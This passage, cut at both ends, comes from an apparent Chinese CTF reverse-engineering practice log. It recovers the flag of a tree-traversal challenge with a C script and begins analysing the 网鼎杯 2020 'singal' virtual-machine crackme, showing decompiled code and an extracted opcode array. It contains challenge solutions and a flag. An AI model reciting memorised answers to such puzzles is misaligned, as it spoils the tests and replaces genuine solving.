(__int64)&amp;unk_601278;</span><br><span class="line">  qword_601280 = (__int64)&amp;unk_6010E0;</span><br><span class="line">  qword_601288 = (__int64)&amp;unk_6011A0;</span><br><span class="line">  qword_6011B0 = (__int64)&amp;unk_601128;</span><br><span class="line">  qword_601130 = (__int64)&amp;unk_6012A8;</span><br><span class="line">  qword_601138 = (__int64)&amp;unk_6011D0;</span><br><span class="line">  qword_6011D8 = (__int64)&amp;unk_601248;</span><br><span class="line">  qword_6011E0 = (__int64)&amp;unk_6010C8;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以说这里已经出现了类似flag的字符串，中序和后序遍历给出了，应该是求type3的前序遍历，手写也可以，但是还是找了个脚本，，脚本小子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> post[] = <span class="string">&quot;20f0Th&#123;2tsIS_icArE&#125;e7__w&quot;</span>; <span class="comment">//后序遍历结果</span></span><br><span class="line"><span class="keyword">char</span> mid[] = <span class="string">&quot;2f0t02T&#123;hcsiI_SwA__r7Ee&#125;&quot;</span>; <span class="comment">//中序遍历结果</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start &gt; end)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">int</span> i = start;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; end &amp;&amp; mid[i] != post[root])</span><br><span class="line">        i++;   <span class="comment">//定位根在中序的位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,mid[i]);</span><br><span class="line">    f(root - <span class="number">1</span>-(end - i),start,i - <span class="number">1</span>);  <span class="comment">//递归处理左子树</span></span><br><span class="line">    f(root<span class="number">-1</span>,i + <span class="number">1</span>,end);  <span class="comment">//递归处理右子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    f(<span class="number">24</span>,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>wctf2020{This_IS_A_7reE}</p>
<h1 id="34-网鼎杯-2020-青龙组-singal"><a href="#34-网鼎杯-2020-青龙组-singal" class="headerlink" title="34.[网鼎杯 2020 青龙组]singal"></a>34.[网鼎杯 2020 青龙组]singal</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230708105905281.png" alt="image-20230708105905281"></p>
<p>打开ida，这里打开ida看到了这个弹窗</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230708110316248.png" alt="image-20230708110316248"></p>
<p>不知道什么是DWARF，chat了一下</p>
<p>DWARF（Debugging With Attributed Record Formats）是一种用于调试信息的标准格式。它是一种用于描述程序的调试信息的规范，旨在帮助开发人员在程序编译后进行调试和分析。</p>
<p>在软件开发过程中，编译器会将源代码转换为机器代码，并且还会生成与之关联的调试信息。这些调试信息包括变量名、函数名、源代码行号等，用于在调试器中定位和理解代码的执行过程。</p>
<p>DWARF规范定义了调试信息的结构和编码方式，以及如何将调试信息与编译后的二进制文件相关联。调试器可以读取这些DWARF调试信息，以便在调试过程中提供有关程序状态和执行上下文的详细信息。</p>
<p>DWARF提供了一种通用的调试信息格式，可用于多种编程语言和体系结构。它支持各种调试功能，如查看堆栈跟踪、变量检查、源代码级别的断点设置等。</p>
<p>总而言之，DWARF是一种用于描述程序的调试信息的标准格式，它在软件开发中扮演着关键的角色，帮助开发人员进行程序调试和分析。</p>
<p>了解一下就行了，接着看程序吧</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230708110443887.png" alt="image-20230708110443887"></p>
<p>跟进一下__main()函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !initialized )</span><br><span class="line">  &#123;</span><br><span class="line">    initialized = <span class="number">1</span>;</span><br><span class="line">    __do_global_ctors();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进__do_global_ctors();</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __do_global_ctors()</span><br><span class="line">&#123;</span><br><span class="line">  func_ptr i; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  i = __CTOR_LIST__[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( __CTOR_LIST__[<span class="number">0</span>] == (func_ptr)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; __CTOR_LIST__[(_DWORD)i + <span class="number">1</span>]; i = (func_ptr)((<span class="keyword">char</span> *)i + <span class="number">1</span>) )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( ; i; i = (func_ptr)((<span class="keyword">char</span> *)i - <span class="number">1</span>) )</span><br><span class="line">    __CTOR_LIST__[(_DWORD)i]();</span><br><span class="line">  atexit(__do_global_dtors);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是对这个程序做了某种初始化操作吧，看不太明白，查看字符串信息，运行程序有一个字符串string，看看这个函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230708111357208.png" alt="image-20230708111357208"></p>
<p>说明flag长度是15</p>
<p>回到主函数，这里有一个qmemcpy，因为vm_operad用到了v4，看看给v4赋值了什么，这里赋值长度是从</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230708111920795.png" alt="image-20230708111920795"></p>
<p>403040+1c8=40 3208</p>
<p>选中，shitf+e</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里的赋值，因为v4是int类型，四字节一个数，而且由于是小端存储，比如0x0A,0x00,0x00,0x00应该是0x00,0x00,0x00,0x0A，所以就是10</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">a=[  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span 